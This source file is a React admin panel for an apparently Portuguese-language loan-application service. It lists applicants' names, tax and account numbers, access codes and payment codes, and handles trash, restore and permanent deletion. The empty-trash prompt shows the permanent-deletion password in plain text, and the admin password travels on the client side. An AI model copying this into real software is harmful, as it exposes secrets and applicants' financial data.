import { useState, useMemo, useEffect, useRef } from "react";
import { Trash2, RotateCcw, CheckCircle2, XCircle, Info, History } from "lucide-react";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import { getDeletedApplications, deleteApplication, restoreApplication, deletePermanently, deleteAllPermanently } from "@/lib/admin.functions";

interface AdminDataListProps {
  adminTab: "users" | "trash";
  applications: any[];
  setApplications: React.Dispatch<React.SetStateAction<any[]>>;
  adminPassword: string;
  adminAuthenticated: boolean;
  onUpdateStatus: (id: string, isCorrect: boolean) => void;
  onFetchApplications: () => Promise<void>;
}

export const AdminDataList = ({
  adminTab,
  applications,
  setApplications,
  adminPassword,
  adminAuthenticated,
  onUpdateStatus,
  onFetchApplications
}: AdminDataListProps) => {
  const [deletedApps, setDeletedApps] = useState<any[]>([]);
  const [innerLoading, setInnerLoading] = useState(false);
  const adminScrollRef = useRef<HTMLDivElement>(null);

  const handleScrollPersist = () => {
    if (adminScrollRef.current) {
      sessionStorage.setItem("admin_scroll_pos", adminScrollRef.current.scrollTop.toString());
    }
  };

  useEffect(() => {
    const savedScroll = sessionStorage.getItem("admin_scroll_pos");
    if (savedScroll && adminScrollRef.current) {
      adminScrollRef.current.scrollTop = parseInt(savedScroll);
    }
  }, [adminTab, applications, deletedApps]);

  const filteredApps = useMemo(() => {
    if (adminTab !== "users") return deletedApps;
    return applications;
  }, [applications, deletedApps, adminTab]);

  const fetchDeletedApps = async () => {
    try {
      setInnerLoading(true);
      const data = await getDeletedApplications({ data: { adminPassword } });
      if (data) setDeletedApps(data);
    } catch (err: any) {
      toast.error("Erro ao carregar lixeira: " + (err.message || "Erro desconhecido"));
    } finally {
      setInnerLoading(false);
    }
  };

  useEffect(() => {
    if (adminAuthenticated) {
      if (adminTab === "users") onFetchApplications();
      else fetchDeletedApps();
    }
  }, [adminAuthenticated, adminTab]);

  const deleteItem = async (id: string) => {
    if (!confirm("Mover para a lixeira? Os dados serão apagados definitivamente após 10 dias.")) return;
    
    try {
      const result = await deleteApplication({ data: { id, adminPassword } });
      if (result && result.success) {
        toast.success("Dados movidos para a lixeira");
        setApplications(prev => prev.filter(app => app.id !== id));
      }
    } catch (err: any) {
      toast.error("Erro ao apagar dados: " + (err.message || "Erro desconhecido"));
    }
  };

  const restoreItem = async (id: string) => {
    try {
      const result = await restoreApplication({ data: { id, adminPassword } });
      if (result && result.success) {
        toast.success("Dados recuperados com sucesso");
        setDeletedApps(prev => prev.filter(app => app.id !== id));
      }
    } catch (err) {
      toast.error("Erro ao recuperar dados");
    }
  };

  const permanentDelete = async (id: string) => {
    const permanentPassword = prompt("Digite a senha para remover permanentemente:");
    if (!permanentPassword) return;

    try {
      const result = await deletePermanently({ data: { id, adminPassword, permanentPassword } });
      if (result && result.success) {
        toast.success("Dados removidos permanentemente");
        setDeletedApps(prev => prev.filter(app => app.id !== id));
      }
    } catch (err: any) {
      toast.error(err.message || "Erro ao remover permanentemente");
    }
  };

  const emptyTrash = async () => {
    const permanentPassword = prompt("Digite a senha moneytooll para remover permanentemente:");
    if (!permanentPassword) return;

    try {
      setInnerLoading(true);
      const result = await deleteAllPermanently({ data: { adminPassword, permanentPassword } });
      if (result && result.success) {
        toast.success("Lixeira esvaziada com sucesso");
        setDeletedApps([]);
      }
    } catch (err: any) {
      toast.error(err.message || "Erro ao esvaziar lixeira");
    } finally {
      setInnerLoading(false);
    }
  };

  if (innerLoading) return <div className="text-xs text-muted-foreground animate-pulse text-center py-8">Carregando...</div>;

  if (filteredApps.length === 0) return (
    <div className="space-y-4">
      <div className="text-xs text-muted-foreground italic text-center py-8">Nenhum registo encontrado.</div>
    </div>
  );

  return (
    <div 
      ref={adminScrollRef}
      onScroll={handleScrollPersist}
      className="space-y-4 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar"
    >
      {adminTab === "trash" && deletedApps.length > 0 && (
        <div className="flex justify-end mb-2">
          <button
            onClick={emptyTrash}
            className="flex items-center gap-1.5 px-3 py-1.5 bg-red-600 text-white rounded-lg text-[10px] font-bold hover:bg-red-700 transition-colors shadow-sm"
          >
            <Trash2 className="w-3 h-3" /> Eliminar tudo
          </button>
        </div>
      )}

      {filteredApps.map((app) => (
        <div 
          key={app.id} 
          className={cn(
            "p-4 rounded-2xl border transition-all duration-300 relative group",
            adminTab === "trash" ? "bg-gray-50 border-gray-200" :
            app.analysis_color === 'green' ? "bg-green-50 border-green-200" : 
            app.analysis_color === 'red' ? "bg-red-50 border-red-200" : 
            "bg-white border-border/40 shadow-sm"
          )}
        >
          {adminTab === "users" ? (
            <button 
              onClick={() => deleteItem(app.id)}
              className="absolute top-3 right-3 p-2 text-muted-foreground hover:text-destructive transition-colors rounded-full hover:bg-destructive/10"
              title="Mover para lixeira"
            >
              <Trash2 className="w-4 h-4" />
            </button>
          ) : (
            <div className="absolute top-3 right-3 flex gap-1">
              <button 
                onClick={() => restoreItem(app.id)}
                className="p-2 text-primary hover:bg-primary/10 transition-colors rounded-full"
                title="Recuperar dados"
              >
                <RotateCcw className="w-4 h-4" />
              </button>
              <button 
                onClick={() => permanentDelete(app.id)}
                className="p-2 text-destructive hover:bg-destructive/10 transition-colors rounded-full"
                title="Remover permanentemente"
              >
                <Trash2 className="w-4 h-4" />
              </button>
            </div>
          )}

          <div className="space-y-4">
            <div className="flex justify-between items-start">
              <div className="space-y-1">
                <p className="text-[10px] font-black text-primary uppercase tracking-wider">
                  {adminTab === "trash" ? "Apagado" : "Empréstimo"} #{app.id.slice(0, 8).toUpperCase()}
                </p>
                <h4 className="text-base font-bold text-foreground">{app.name || "Nome não informado"}</h4>
              </div>
              <div className="flex flex-col items-end gap-1">
                <span className={cn(
                  "text-[10px] px-2 py-1 rounded-full font-bold uppercase",
                  app.status === 'Pendente' ? "bg-amber-100 text-amber-700" : 
                  app.analysis_color === 'green' ? "bg-green-100 text-green-700" : "bg-red-100 text-red-700"
                )}>
                  {app.status || 'Pendente'}
                </span>
              </div>
            </div>
            
            <div className="grid grid-cols-2 gap-x-4 gap-y-3 py-3 border-y border-border/10">
              <div className="space-y-0.5">
                <p className="text-[9px] text-muted-foreground uppercase font-bold">NIF / Conta</p>
                <p className="text-xs font-bold">{app.nif || "---"} | {app.account_number || "---"}</p>
              </div>
              <div className="space-y-0.5">
                <p className="text-[9px] text-muted-foreground uppercase font-bold">Total a Devolver</p>
                <p className="text-xs font-black text-primary">{app.total_to_refund ? `${Number(app.total_to_refund).toLocaleString()} Kz` : "---"}</p>
              </div>
              <div className="space-y-0.5">
                <p className="text-[9px] text-muted-foreground uppercase font-bold">Cód. Acesso</p>
                <p className="text-xs font-mono font-bold text-muted-foreground">{app.access_code || "---"}</p>
              </div>
              <div className="space-y-0.5">
                <p className="text-[9px] text-muted-foreground uppercase font-bold">Cód. Pagamento</p>
                <p className="text-xs font-mono font-bold text-primary">{app.payment_code || "---"}</p>
              </div>
            </div>

            {adminTab === "users" && (
              <div className="flex gap-2 pt-2">
                <button
                  onClick={() => onUpdateStatus(app.id, true)}
                  className="flex-1 bg-green-600 hover:bg-green-700 text-white py-2.5 rounded-xl text-[11px] font-bold transition-all shadow-md shadow-green-200 flex items-center justify-center gap-1.5"
                >
                  <CheckCircle2 className="w-3.5 h-3.5" /> Dados corretos
                </button>
                <button
                  onClick={() => onUpdateStatus(app.id, false)}
                  className="flex-1 bg-red-600 hover:bg-red-700 text-white py-2.5 rounded-xl text-[11px] font-bold transition-all shadow-md shadow-red-200 flex items-center justify-center gap-1.5"
                >
                  <XCircle className="w-3.5 h-3.5" /> Dados errados
                </button>
              </div>
            )}

            <div className="text-[9px] text-muted-foreground/60 text-center italic space-y-1">
              <div>Criado em: {new Date(app.created_at).toLocaleString()}</div>
              {adminTab === "trash" && app.deleted_at && (
                <div className="text-destructive font-bold">Apagado em: {new Date(app.deleted_at).toLocaleString()}</div>
              )}
            </div>
          </div>
        </div>
      ))}
    </div>
  );
};
